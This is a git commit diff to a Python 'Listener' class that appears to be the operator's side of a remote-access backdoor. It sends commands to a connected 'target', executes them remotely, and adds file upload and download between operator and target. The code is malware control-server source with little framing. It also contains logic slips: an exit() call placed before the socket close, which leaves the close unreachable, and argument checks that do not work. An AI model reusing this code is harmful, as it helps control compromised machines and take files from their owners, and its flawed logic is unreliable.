7847413ee6de0fd6dbf33ed10a342bdbf7e8d64b
Madhav Anand <madhav1004@icloud.com>
2021-02-03 12:54:24 +0530

    exit is qorking without breaking address.

--- main.py
+++ main.py
@@ -19,12 +19,22 @@ class Listener:
             output = self.execute_remotely(command=command)
             print(output)
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            data = file.read().decode("utf-8")
+            return data
+
     def execute_remotely(self, command):
-        self.reliable_send(command)
+        sending_command = command
         command_split = command.split()
+        if command_split[0] == "upload" and command_split[1] is not None:
+            sending_command = f"upload {command_split[1]} " + self.read_file(command_split[1])
+
+        self.reliable_send(sending_command)
+
         if command_split[0] == "quit":
-            self.target.close()
             exit()
+            self.target.close()
         elif command_split[0] == "download" and command_split[1] is not None:
             # write a file
             receive = self.reliable_receive()
@@ -36,6 +46,14 @@ class Listener:
         else:
             receive = self.reliable_receive()
             return receive
+
+
+    def write_file(self, file_path, data):
+        file_name = os.path.basename(file_path)
+        with open(file_name, "wb") as file:
+            file.write(data.encode())
+            file.close()
+            return f"File saved {file_name}"
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
